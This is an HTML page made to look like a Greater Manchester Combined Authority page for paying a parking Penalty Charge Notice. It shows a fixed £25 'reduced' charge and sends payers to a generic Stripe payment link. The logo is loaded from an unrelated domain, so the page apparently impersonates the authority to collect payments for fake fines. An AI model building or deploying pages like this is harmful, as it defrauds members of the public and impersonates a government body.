<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Pay your PCN – GMCA</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- GOV.UK Frontend CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/govuk-frontend@4.13.0/dist/govuk-frontend-4.13.0.min.css">

  <!-- Custom styles -->
  <link rel="stylesheet" href="../start/style.css">
</head>

<body>
  <!-- Header -->
  <header class="gmca-header">
    <div class="gmca-header__container">
      <a href="https://www.greatermanchester-ca.gov.uk/" target="_blank" rel="noopener">
        <img src="https://eryripress.co.uk/icon3.svg" alt="GMCA logo" class="gmca-logo">
      </a>
    </div>
  </header>

  <!-- Search bar -->
  <div class="gmca-search-bar">
    <div class="gmca-search-container">
      <form id="gmca-search-form">
        <input id="gmca-search-input" type="text" placeholder="Search Greater Manchester Combined Authority...">
        <button type="submit">Search</button>
      </form>
    </div>
  </div>

  <!-- Breadcrumb -->
  <nav class="gmca-breadcrumb">
    <a href="https://www.greatermanchester-ca.gov.uk/">Home</a> ›
    <a href="/portal">Parking Fines</a> ›
    <span>Pay PCN</span>
  </nav>

  <!-- Main content -->
  <main class="gmca-main">
    <div class="lookup-card">
      <h2 class="page-title">Confirm Penalty Charge Notice</h2>

      <div class="info-box">
        <p><strong>PCN Number:</strong> <span id="pcn-value">Loading...</span></p>
      </div>

      <div class="info-box">
        <p><strong>Vehicle Registration:</strong> <span id="vrm-value">Loading...</span></p>
      </div>

      <div class="info-box">
        <p><strong>Total:</strong> £25.00</p>
      </div>

      <p class="govuk-hint reduced-text">
        Reduced by 50% as the charge will be paid within 14 days of the issue date.
      </p>

      <button id="pay-button" class="gmca-button teal">Proceed to Payment</button>

      <div class="bottom-text">
        <p><a href="/portal" class="govuk-link">Go back</a></p>
      </div>
    </div>
  </main>

  <!-- Footer -->
  <footer class="gmca-footer">
    <p>© Greater Manchester Combined Authority 2025</p>
  </footer>

  <script>
    // Search bar behaviour
    document.addEventListener("DOMContentLoaded", function () {
      const searchForm = document.getElementById("gmca-search-form");
      const searchInput = document.getElementById("gmca-search-input");

      searchForm.addEventListener("submit", function (e) {
        e.preventDefault();
        const query = encodeURIComponent(searchInput.value.trim());
        if (query) {
          window.location.href = `https://www.greatermanchester-ca.gov.uk/search?Query=${query}`;
        }
      });

      // PCN details
      const params = new URLSearchParams(window.location.search);
      const pcn = params.get("pcn");
      const vrm = params.get("vrm");

      const pcnValue = document.getElementById("pcn-value");
      const vrmValue = document.getElementById("vrm-value");
      const payBtn = document.getElementById("pay-button");

      if (pcn && vrm) {
        pcnValue.textContent = pcn;
        vrmValue.textContent = vrm;
      } else {
        pcnValue.textContent = "Missing";
        vrmValue.textContent = "Missing";
        payBtn.disabled = true;
      }

      // Redirect to Stripe (or your processor)
      payBtn.addEventListener("click", function () {
        const stripeUrl = "https://buy.stripe.com/5kQ6oJefgdMifphh1g1RC00";
        window.location.href = `${stripeUrl}?pcn=${encodeURIComponent(pcn)}&vrm=${encodeURIComponent(vrm)}`;
      });
    });
  </script>
</body>
</html>
